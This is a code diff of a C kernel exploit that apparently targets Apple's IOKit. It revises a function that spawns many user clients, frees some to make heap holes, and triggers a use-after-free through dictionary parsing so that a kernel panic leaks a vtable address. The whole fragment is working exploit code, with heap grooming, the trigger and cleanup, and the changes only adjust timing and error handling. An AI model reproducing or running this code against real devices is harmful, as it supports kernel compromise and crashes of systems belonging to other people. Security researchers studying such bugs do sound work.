@@ -1,5 +1,5 @@
 #include <stdint.h>             // uint32_t
-#include <unistd.h>             // sleep, sync
+#include <unistd.h>             // usleep, sync
 
 #include <IOKit/IOKitLib.h>     // IO*, io_*
 
@@ -62,7 +62,7 @@ static const char *services[] =
 };
 #endif
 
-void uaf_panic_leak_vtab()
+void uaf_panic_leak_vtab(void)
 {
     DEBUG("Using UAF to (panic-)leak vtable...");
 
@@ -129,7 +129,7 @@ void uaf_panic_leak_vtab()
     PRINT_BUF("dict_pad ", dict_pad,  sizeof(dict));
 
     DEBUG("Spawning user clients...");
-    io_service_t service = _io_get_service(NULL);
+    io_service_t service = _io_get_service();
     io_connect_t client_plug,
                  client_hole[NUM_CLIENTS],
                  client_pad [NUM_CLIENTS];
@@ -162,24 +162,25 @@ void uaf_panic_leak_vtab()
         })
     }
 
-    DEBUG("Poking holes...");
-    // This is equivalent to cleanup, so no try blocks
-    for(uint32_t i = 0; i < NUM_CLIENTS; ++i)
-    {
-        _io_release_client(client_hole[i]);
-    }
-
-    DEBUG("Fire in the hole! (This should panic.)");
-    // Write everything to disk
-    sync();
-    // Allow SSH to deliver latest output
-    sleep(1);
-
     TRY
     ({
+        DEBUG("Poking holes...");
+        // This is equivalent to cleanup, so no try blocks
+        for(uint32_t i = 0; i < NUM_CLIENTS; ++i)
+        {
+            _io_release_client(client_hole[i]);
+        }
+
+        DEBUG("Fire in the hole! (This should panic.)");
+        // Write everything to disk
+        sync();
+        // Async cleanup & allow SSH to deliver latest output
+        usleep(10000);
+
         dict_parse(dict, sizeof(dict));
+        DEBUG("...shit, we're still here.");
     })
-    RETHROW
+    FINALLY
     ({
         for(uint32_t i = 0; i < NUM_CLIENTS; ++i)
         {
@@ -187,13 +188,5 @@ void uaf_panic_leak_vtab()
         }
         _io_release_client(client_plug);
     })
-    DEBUG("...shit, we're still here.");
-
-    DEBUG("Releasing remaining clients...");
-    // No try blocks around cleanup
-    for(uint32_t i = 0; i < NUM_CLIENTS; ++i)
-    {
-        _io_release_client(client_pad[i]);
-    }
-    _io_release_client(client_plug);
+    usleep(10000); // Async cleanup
 }
